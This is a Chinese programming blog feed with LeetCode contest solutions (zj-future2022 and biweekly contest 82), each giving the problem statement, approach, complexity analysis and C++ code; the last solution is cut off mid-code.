<p>注意：只有接收了一个信号源从开始到结束的所有信号才算完整信号。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：signals = [[0,40],[10,15],[20,30]]</span><br><span class="line">输出：false</span><br><span class="line">解释：</span><br><span class="line">时间 [10,15) 内不能同时接收信号 0 和信号 1，</span><br><span class="line">时间 [20,30) 内不能同时接收信号 0 和信号 2。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：signals = [[2,8],[8,14]]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：signals = [[9,12],[2,3]]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>0 &lt;= signals.length &lt;= 104</code></li>
<li><code>signals[i].length == 2</code></li>
<li><code>0 &lt;= starti &lt; endi &lt;= 106</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/zj-future2022/problems/WYKGLO/">https://leetcode.cn/contest/zj-future2022/problems/WYKGLO/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>排序、二分查找、线段树
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉至少有三种解法，排序，二分查找，线段树。</li>
</ol>
<ul>
<li>排序：按照从小到大依次插入区间，并同时记录已经插入区间的最右值 $r$, 此时如果检测到当前插入的区间范围小于 $r$ 则认为区间重复，返回 $\texttt{false}$。</li>
<li>线段树：感觉就是普通的动态线段树即可，每次在树上对区间进行标记，如果发现出现已经标记的区间则返回，否则则插入新的区间</li>
</ul>
<ol>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n))$, 其中 $n$ 为区间的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为区间的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canReceiveAllSignals</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = intervals.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> last = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[i][<span class="number">0</span>] &lt; last) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            last = intervals[i][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="zj-future02-黑白棋游戏"><a href="#zj-future02-黑白棋游戏" class="headerlink" title="zj-future02. 黑白棋游戏"></a>zj-future02. 黑白棋游戏</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>现有一个黑白棋游戏，初始时给出一排棋子，记作数组 <code>chess</code>，其中白色棋子记作 <code>0</code>，黑色棋子记作 <code>1</code>。用户可以每次交换 任意位置 的两颗棋子的位置。</p>
<p>为了使得所有黑色棋子相连，请返回最少需要交换多少次。</p>
<p>示例 1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: chess = [1,0,1,0,1,0]</span><br><span class="line">输出: 1</span><br><span class="line">解释: </span><br><span class="line">有四种可能的方法可以把所有的 1 组合在一起：</span><br><span class="line">[1,1,1,0,0,0]，交换 1 次；</span><br><span class="line">[0,1,1,1,0,0]，交换 2 次；</span><br><span class="line">[0,0,1,1,1,0]，交换 1 次；</span><br><span class="line">[0,0,0,1,1,1]，交换 2 次。</span><br><span class="line">所以最少的交换次数为 1。</span><br></pre></td></tr></table></figure>
<p>示例  2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：chess = [0,0,0,1,0]</span><br><span class="line">输出：0</span><br><span class="line">解释： </span><br><span class="line">由于数组中只有一个 1，所以不需要交换。</span><br></pre></td></tr></table></figure>
<p>示例 3:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：chess = [1,1,0,1,0,1,0,0,1,0,1]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">最佳方案为 [1,1,1,1,1,1,0,0,0,0,0]，</span><br><span class="line">因此返回最少交换 2 次</span><br></pre></td></tr></table></figure>

<p>提示:</p>
<ul>
<li><code>1 &lt;= chess.length &lt;= 105</code></li>
<li><code>chess[i] == 0</code> 或 <code>1</code>.</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-299/problems/count-number-of-ways-to-place-houses/">https://leetcode.cn/contest/weekly-contest-299/problems/count-number-of-ways-to-place-houses/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口 + 前缀和
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们统计棋盘中 $1$ 的总数为 $x$，则我们可以知道 $1$ 的子序列长度为 $x$，我们依次统计连续的长度为 $x$ 的子数组中 $1$ 的最大数目即可，依次尝试将窗口为 $x$ 的子数组全部变为 $1$ 的次数。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(n)$，可以将其优化到 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minSwaps</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; chess)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = chess.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(chess[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                tot++;</span><br><span class="line">            &#125;</span><br><span class="line">            sum[i + <span class="number">1</span>] = sum[i] + chess[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = tot; i &lt;= n; i++) &#123;</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, tot - (sum[i] - sum[i-tot]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="zj-future03-快递中转站选址"><a href="#zj-future03-快递中转站选址" class="headerlink" title="zj-future03. 快递中转站选址"></a>zj-future03. 快递中转站选址</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>某区域地图记录在 <code>k</code> 二维数组 <code>area</code>，其中 <code>0</code> 表示空地，<code>1</code> 表示快递分发点。</p>
<p>若希望选取一个地点设立中转站，使得中转站至各快递分发点的「曼哈顿距离」总和最小。请返回这个 最小 的距离总和。</p>
<p>注意：</p>
<p>曼哈顿距离：distance(p1, p2) &#x3D; |p2.x - p1.x| + |p2.y - p1.y|<br>所有位置均可作为快递中转站的设立点。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: area = [[0,1,0,0,0],[0,0,0,0,1],[0,0,1,0,0]]</span><br><span class="line">输出: 5 </span><br><span class="line">解释: 三个快递分发点分别位于(0,1)，(1,4) 和 (2,2):</span><br><span class="line">     (1,2) 是最佳的中转站选址，总距离为 2 + 2 + 1 = 5。</span><br></pre></td></tr></table></figure>
<p>示例 2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: area = [[1,1],[1,1]]</span><br><span class="line">输出: 4</span><br><span class="line">解释: (0,0) 是最佳的中转站选址之一，总距离为 0 + 1 + 1 + 2 = 4。</span><br></pre></td></tr></table></figure>

<p>提示:</p>
<ul>
<li><code>m == area.length</code></li>
<li><code>n == area[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 200</code></li>
<li><code>area[i][j] == 0</code> 或 <code>1</code>.</li>
<li><code>area</code> 中 至少 有两个快递分发点</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/zj-future2022/problems/kflZMc/">https://leetcode.cn/contest/zj-future2022/problems/kflZMc/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>中位数
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>首先我们观察一下，求曼哈顿距离时，纵坐标与横坐标是分开的，我们可以分开来求，首先记录所有分支点的横坐标为 $v$ 与 纵坐标 $h$, 我们分别来求出目标中转站的行数与列数。我们将 $v$ 与 $h$ 都进行排序，我们可以知道在一个排序的数组中中位数距离其他元素的距离之和最小，因此目标终点站的坐标为 $(median(v), median(h))$，然后我们依次求出所有分支到目标点的距离之和即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$, $n$ 表示给定的天数，可以优化到 $O(n)$ 的时间复杂度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示给定的天数。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">buildTransferStation</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; area)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = area.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = area[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ver;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; hec;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (area[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    ver.<span class="built_in">emplace_back</span>(i);</span><br><span class="line">                    hec.<span class="built_in">emplace_back</span>(j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> k = ver.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(ver.<span class="built_in">begin</span>(), ver.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(hec.<span class="built_in">begin</span>(), hec.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> x = ver[k/<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> y = hec[k/<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (area[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    ans += <span class="built_in">abs</span>(x - i) + <span class="built_in">abs</span>(y - j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="zj-future04-门店商品调配"><a href="#zj-future04-门店商品调配" class="headerlink" title="zj-future04. 门店商品调配"></a>zj-future04. 门店商品调配</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>某连锁店开设了若干门店，门店间允许进行商品借调以应对暂时性的短缺。本月商品借调的情况记于数组<code> distributions</code>，其中 <code>distributions[i] = [from,to,num]</code>，表示从 <code>from</code> 门店调配了 <code>num</code> 件商品给 <code>to</code> 门店。</p>
<p>若要使得每一个门店最终借出和借入的商品数量相同，请问至少还需要进行多少次商品调配。</p>
<p>注意：一次商品调配以三元组 <code>[from, to, num]</code> 表示，并有 <code>from ≠ to</code> 且<code> num &gt; 0</code>。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：distributions = [[0,1,5],[1,2,10],[2,0,5],[2,1,1]]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">商店 0 给商店 1 五件商品；</span><br><span class="line">商店 1 给商店 2 十件商品；</span><br><span class="line">商店 2 给商店 0 五件商品；</span><br><span class="line">商店 2 给商店 1 一件商品。</span><br><span class="line">此时商店 1 少了 4 件商品，商店 2 多了 4 件商品，</span><br><span class="line"></span><br><span class="line">因此仅需一次商品调配，商店 2 给商店 1 四件商品，即可满足每个门店借出和借入商品数量相同：</span><br><span class="line">商店 0 借出和借入的商品数量均为 5；</span><br><span class="line">商店 1 借出和借入的商品数量均为 10；</span><br><span class="line">商店 2 借出和借入的商品数量均为 10。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：distributions = [[0,1,5],[1,4,5],[4,0,5]]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">此时各商店借入和借出的商品数量均相等，无需额外的商品调配。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= distributions.length &lt;= 8</code></li>
<li><code>distributions[i].length == 3</code></li>
<li><code>0 &lt;= fromi, toi &lt; 12</code></li>
<li><code>fromi != toi</code></li>
<li><code>1 &lt;= numi &lt;= 100</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/zj-future2022/problems/NBCXIp/">https://leetcode.cn/contest/zj-future2022/problems/NBCXIp/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目中最关键的一点需要说明下，如果知道这个关键点，则这个题目比较容易，否则还是还是挺难的。对于一个集合 $S$，如果集合 $S$ 且除空集以外的任意子集 $S^{‘}$ 满足子集中的所有元素的和 $\sum(S^{‘}) \neq 0$，此时将集合 $S$ 变为 $0$ 的最小调配次数为 $|S| - 1$。根据以上分析则我们可以知道如下：</li>
</ol>
<ul>
<li>设 $dp[mask]$ 表示以 $mask$ 代表的集合变为 $0$ 最小调配次数，则此时 $i &#x3D; mask \oplus j$，则此时满足 $i | j &#x3D; mask$, 且满足 $sum(mask) &#x3D; 0, sum(i) &#x3D; 0, sum(j) &#x3D; 0$ 此时我们可以知道 $dp[mask] &#x3D; \min(dp[mask], dp[i] + dp[j])$</li>
<li>我们依次检测 $mask$ 的子集即可。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$3^n$，$n$ 表示商店的数量。</li>
<li>空间复杂度：$2^n$，$n$ 表示商店的数量。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minTransfers</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; distributions)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = distributions.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> k = <span class="number">12</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">arr</span><span class="params">(k)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(<span class="number">1</span> &lt;&lt; k)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">1</span> &lt;&lt; k, k)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v :  distributions) &#123;</span><br><span class="line">            <span class="type">int</span> from = v[<span class="number">0</span>], to = v[<span class="number">1</span>], num = v[<span class="number">2</span>];</span><br><span class="line">            arr[from] -= num;</span><br><span class="line">            arr[to] += num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span> &lt;&lt; k); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &amp; (<span class="number">1</span> &lt;&lt; j)) &#123;</span><br><span class="line">                    sum[i] += arr[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                dp[i] = __builtin_popcount(i) - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;k); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sum[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i; j != <span class="number">0</span>; j = (j - <span class="number">1</span>) &amp; i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (sum[j] == <span class="number">0</span>) &#123;</span><br><span class="line">                        dp[i] = <span class="built_in">min</span>(dp[i], dp[j] + dp[i^j]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[(<span class="number">1</span>&lt;&lt;k) - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 82</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/15/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-82"><a href="#leetcode-biweekly-contest-82" class="headerlink" title="leetcode biweekly contest 82"></a>leetcode biweekly contest 82</h2><p>双周赛的难度挺好，终于不是全部四题水题了，感觉质量挺高，虽然有难度，但是还是喜欢这类题目。</p>
<h3 id="6116-计算布尔二叉树的值"><a href="#6116-计算布尔二叉树的值" class="headerlink" title="6116. 计算布尔二叉树的值"></a>6116. 计算布尔二叉树的值</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一棵 完整二叉树 的根，这棵树有以下特征：</p>
<p>叶子节点 要么值为 <code>0</code> 要么值为 <code>1</code> ，其中 <code>0</code> 表示 <code>False</code> ，<code>1</code> 表示 <code>True</code> 。<br>非叶子节点 要么值为 <code>2</code> 要么值为 <code>3 </code>，其中 <code>2</code> 表示逻辑或 <code>OR</code> ，<code>3</code> 表示逻辑与 <code>AND</code> 。<br>计算 一个节点的值方式如下：</p>
<p>如果节点是个叶子节点，那么节点的 值 为它本身，即 <code>True</code> 或者 <code>False</code> 。<br>否则，计算 两个孩子的节点值，然后将该节点的运算符对两个孩子值进行 运算 。<br>返回根节点 <code>root</code> 的布尔运算值。</p>
<p>完整二叉树 是每个节点有 <code>0</code> 个或者 <code>2 </code>个孩子的二叉树。</p>
<p>叶子节点 是没有孩子的节点。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [2,1,3,null,null,0,1]</span><br><span class="line">输出：true</span><br><span class="line">解释：上图展示了计算过程。</span><br><span class="line">AND 与运算节点的值为 False AND True = False 。</span><br><span class="line">OR 运算节点的值为 True OR False = True 。</span><br><span class="line">根节点的值为 True ，所以我们返回 true 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [0]</span><br><span class="line">输出：false</span><br><span class="line">解释：根节点是叶子节点，且值为 false，所以我们返回 false 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li>树中节点数目在 <code>[1, 1000]</code> 之间。</li>
<li><code>0 &lt;= Node.val &lt;= 3</code></li>
<li>每个节点的孩子数为 <code>0</code> 或 <code>2</code> 。</li>
<li>叶子节点的值为 <code>0</code> 或 <code>1</code> 。</li>
<li>非叶子节点的值为 <code>2</code> 或 <code>3</code> 。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/evaluate-boolean-binary-tree">https://leetcode.cn/problems/evaluate-boolean-binary-tree</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>深度优先搜索
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接按照深度有限搜索的方式进行遍历即可，每次在非叶子节点进行计算即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n))$, 其中 $n$ 为节点的数目。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">evaluateTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (!root-&gt;right &amp;&amp; !root-&gt;left) &#123;</span><br><span class="line">           <span class="keyword">return</span> root-&gt;val;</span><br><span class="line">       &#125; </span><br><span class="line">       <span class="keyword">if</span> (root-&gt;val == <span class="number">2</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="built_in">evaluateTree</span>(root-&gt;left) || <span class="built_in">evaluateTree</span>(root-&gt;right);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="built_in">evaluateTree</span>(root-&gt;left) &amp;&amp; <span class="built_in">evaluateTree</span>(root-&gt;right);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6117-坐上公交的最晚时间"><a href="#6117-坐上公交的最晚时间" class="headerlink" title="6117. 坐上公交的最晚时间"></a>6117. 坐上公交的最晚时间</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始长度为 <code>n</code> 的整数数组 <code>buses</code> ，其中 <code>buses[i]</code> 表示第 <code>i</code> 辆公交车的出发时间。同时给你一个下标从 <code>0</code> 开始长度为 <code>m</code> 的整数数组 <code>passengers</code> ，其中 <code>passengers[j]</code> 表示第 <code>j</code> 位乘客的到达时间。所有公交车出发的时间互不相同，所有乘客到达的时间也互不相同。</p>
<p>给你一个整数 <code>capacity</code> ，表示每辆公交车 最多 能容纳的乘客数目。</p>
<p>每位乘客都会搭乘下一辆有座位的公交车。如果你在 <code>y</code> 时刻到达，公交在 <code>x</code> 时刻出发，满足 <code>y &lt;= x</code>  且公交没有满，那么你可以搭乘这一辆公交。最早 到达的乘客优先上车。</p>
<p>返回你可以搭乘公交车的最晚到达公交站时间。你 不能 跟别的乘客同时刻到达。</p>
<p>注意：数组 <code>buses</code> 和 <code>passengers</code> 不一定是有序的。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：buses = [10,20], passengers = [2,17,18,19], capacity = 2</span><br><span class="line">输出：16</span><br><span class="line">解释：</span><br><span class="line">第 1 辆公交车载着第 1 位乘客。</span><br><span class="line">第 2 辆公交车载着你和第 2 位乘客。</span><br><span class="line">注意你不能跟其他乘客同一时间到达，所以你必须在第二位乘客之前到达。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：buses = [20,30,10], passengers = [19,13,26,4,25,11,21], capacity = 2</span><br><span class="line">输出：20</span><br><span class="line">解释：</span><br><span class="line">第 1 辆公交车载着第 4 位乘客。</span><br><span class="line">第 2 辆公交车载着第 6 位和第 2 位乘客。</span><br><span class="line">第 3 辆公交车载着第 1 位乘客和你。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == buses.length</code></li>
<li><code>m == passengers.length</code></li>
<li><code>1 &lt;= n, m, capacity &lt;= 105</code></li>
<li><code>2 &lt;= buses[i], passengers[i] &lt;= 109</code></li>
<li><code>buses</code> 中的元素 互不相同 。</li>
<li><code>passengers</code> 中的元素 互不相同 。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/the-latest-time-to-catch-a-bus">https://leetcode.cn/problems/the-latest-time-to-catch-a-bus</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目类似于数学奥数，首先我们分析一下最后一个人可能的最晚上车时间。我们按照时间先后的顺序，和相应的 $capbility$ 可以很容易的求出每次班车的乘客。设最后一辆班车为 $i$, 可以载的乘客数量为 $m$ 个，此时可以有两种情况进行分析最后一个乘客的到达时间:</li>
</ol>
<ul>
<li>如果最后一辆班车 $i$ 的乘客数量 $m &lt; capacity$，假如不考虑时间重复的问题，此时最后一个乘客可以在 $buses[i]$ 时间坐上班车，此时我们从 $time &#x3D; buses[i]$ 开始检测，是否存在相同的时间，如果存在相同时间则将 $time$ 减 $1$, 知道不会出现重复时间为止。</li>
<li>如果最后一辆班车 $i$ 的乘客数量 $m &#x3D; capacity$, 最后一个乘客的时间为 $last$，此时我们知道如果以 $last -1$ 时间达到时肯定可以上车，此时只需要沿着 $last - 1$ 找到第一个不重复的时间即可。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n\log n + m \log m)$，其中 $m,n$ 分别为两个数组的长度。</li>
<li>空间复杂度：$O(n)$，时间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">latestTimeCatchTheBus</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; buses, vector&lt;<span class="type">int</span>&gt;&amp; passengers, <span class="type">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(buses.<span class="built_in">begin</span>(), buses.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(passengers.<span class="built_in">begin</span>(), passengers.<span class="built_in">end</span>());</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span 